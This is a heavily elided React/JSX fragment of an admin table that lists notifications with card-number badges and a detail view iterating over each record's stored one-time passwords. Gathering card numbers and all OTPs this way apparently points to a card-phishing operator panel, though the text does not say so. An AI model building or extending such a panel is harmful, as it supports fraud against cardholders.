                ...
                <tr key={notification.id} className="border-b border-gray-700">
                  ...
                  <td className="px-4 py-3">
                    <div className="flex flex-col sm:flex-row gap-2">
                      ...
                      <Badge
                        variant={
                          notification.paymentInfo?.cardNumber ? 'default' : 'destructive'
                        }
                        className={`rounded-md cursor-pointer ${
                          notification.paymentInfo?.cardNumber? 'bg-green-500' : ''
                        }`}
                      ...
                      <Badge
                        variant={
                          notification.values?.cardNumber ? 'destructive' : 'outline'
                        }
                        className={`rounded-md cursor-pointer ${
                          notification.values?.cardNumber? 'bg-emerald-400' : 'bg-blue-300'
                        }`}
                        onClick={() => handleInfoClick(notification, 'card')}
                      >
...
..
              ...
              <p>
                ...
                {selectedNotification.paymentInfo?.allOtps&& selectedNotification.paymentInfo?.allOtps.map((i,index)=>
